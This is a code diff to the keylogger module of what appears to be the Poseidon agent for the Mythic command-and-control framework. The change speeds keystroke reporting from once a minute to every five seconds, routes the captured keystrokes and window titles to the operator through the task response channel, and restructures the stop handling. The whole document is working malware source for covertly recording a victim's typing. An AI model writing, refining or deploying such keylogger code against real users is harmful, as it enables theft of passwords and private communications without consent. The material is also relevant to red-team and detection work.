@@ -1,16 +1,12 @@
 package keystate
 
 import (
-	// Standard
-	"encoding/json"
 	"errors"
 	"fmt"
 	"os/user"
 	"sync"
 	"time"
 
-	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
@@ -100,18 +96,12 @@ func (k *KeyLogWithMutex) SetWindowTitle(s string) {
 func (k *KeyLogWithMutex) SendMessage() {
 	serMsg := ksmonitor.ToSerialStruct()
 	msg := structs.Response{}
-	msg.TaskID = curTask.TaskID
-	keylogs := make([]structs.Keylog, 0, 1)
+	keylogs := make([]structs.Keylog, 1)
+	keylogs[0] = serMsg
 	msg.Keylogs = &keylogs
-	data, err := json.MarshalIndent(serMsg, "", "    ")
-	//log.Println("Sending across the wire:", string(data))
-	if err != nil {
-		msg.UserOutput = err.Error()
-		msg.Status = "error"
-		msg.Completed = true
+	if curTask != nil {
+		msg.TaskID = curTask.TaskID
 		curTask.Job.SendResponses <- msg
-	} else {
-		profiles.TaskResponses = append(profiles.TaskResponses, data)
 	}
 }
 
@@ -135,21 +125,17 @@ func StartKeylogger(task structs.Task) error {
 	curTask = &task
 	go func() {
 		for {
-			timer := time.NewTimer(time.Minute)
+			timer := time.NewTimer(time.Second * 5)
 			<-timer.C
+			if task.ShouldStop() {
+				curTask = nil
+				return
+			}
 			if ksmonitor.Keystrokes != "" {
 				ksmonitor.mtx.Lock()
 				ksmonitor.SendMessage()
 				ksmonitor.Keystrokes = ""
 				ksmonitor.mtx.Unlock()
-			}
-			if task.ShouldStop() {
-				msg := structs.Response{}
-				msg.TaskID = curTask.TaskID
-				msg.UserOutput = "Keylogging stopped"
-				task.Job.SendResponses <- msg
-				curTask = nil
-				break
 			}
 		}
 	}()
